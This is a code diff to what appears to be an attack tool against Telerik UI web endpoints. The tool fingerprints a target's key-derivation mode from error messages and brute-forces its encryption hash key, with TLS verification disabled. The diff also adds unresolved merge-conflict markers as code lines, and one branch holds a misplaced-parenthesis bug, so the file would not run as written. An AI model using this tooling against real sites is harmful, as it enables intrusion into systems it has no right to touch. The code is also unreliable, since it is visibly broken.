@@ -263,7 +263,11 @@ class AsyncUpload:
         if int(version[:4]) <= 2017 or version == "2018.1.117":
             return ["PBKDF1_MS"]
 
+<<<<<<< HEAD
         elif (int(version[:4]) >= 2020) or (int(version[:4]) == 2019 and int(version[5] >= 2)):
+=======
+        elif (int(version[:4]) >= 2020) or (int(version[:4]) == 2019 and int(version[5]) >= 2):
+>>>>>>> d2143cd639dc4d4a1598f1601afa83cb08f06431
             return ["PBKDF2"]
 
         else:  # We don't have solid intelligence on these version so we will try both
@@ -350,7 +354,7 @@ class DialogHandler:
         res = requests.post(self.url, data=KDF_probe_data, proxies=self.proxies, headers=self.headers, verify=False)
         resp_body = res.text
 
-        if "Exception of type 'System.Exception' was thrown" in resp_body:
+        if "Exception of type 'System.Exception' was thrown" in resp_body or "The cryptographic operation has failed!" in resp_body:
             self.key_derive_mode = "PBKDF2"
             print(
                 "Target is a newer version of Telerik UI without verbose error messages. Hash key and Encryption key will have to BOTH match. PBKDF2 key derivation is used."
@@ -363,7 +367,7 @@ class DialogHandler:
         elif "Invalid length for a Base-64 char array or string" in resp_body:
             return
         else:
-            print("Unexpected response encountered, aborting.")
+            print(f"Unexpected response encountered: [{resp_body}] aborting.")
             sys.exit()
 
         print("Target is a valid DialogHandler endpoint. Brute forcing Telerik Hash Key...")
@@ -524,6 +528,7 @@ def main():
     if "webresource.axd" in args.url.lower():
         print("Assuming target is a AsyncUpload Endpoint...")
         asyncupload_endpoint = args.url.split("?")[0] + "?type=RAU"
+        print(asyncupload_endpoint)
         try:
             res = requests.get(asyncupload_endpoint, proxies=proxies, headers=headers, verify=False)
         except (requests.exceptions.ConnectionError, requests.exceptions.ConnectTimeout):
@@ -554,6 +559,8 @@ def main():
         if "Loading the dialog..." not in resp_body:
             print(f"URL does not appear to be a Telerik UI DialogHandler")
             return
+        else:
+            print(f"Confirmed target is Telerik UI DialogHandler")
 
         dh = DialogHandler(
             args.url, proxies=proxies, headers=headers, include_machinekeys_bool=include_machinekeys_bool
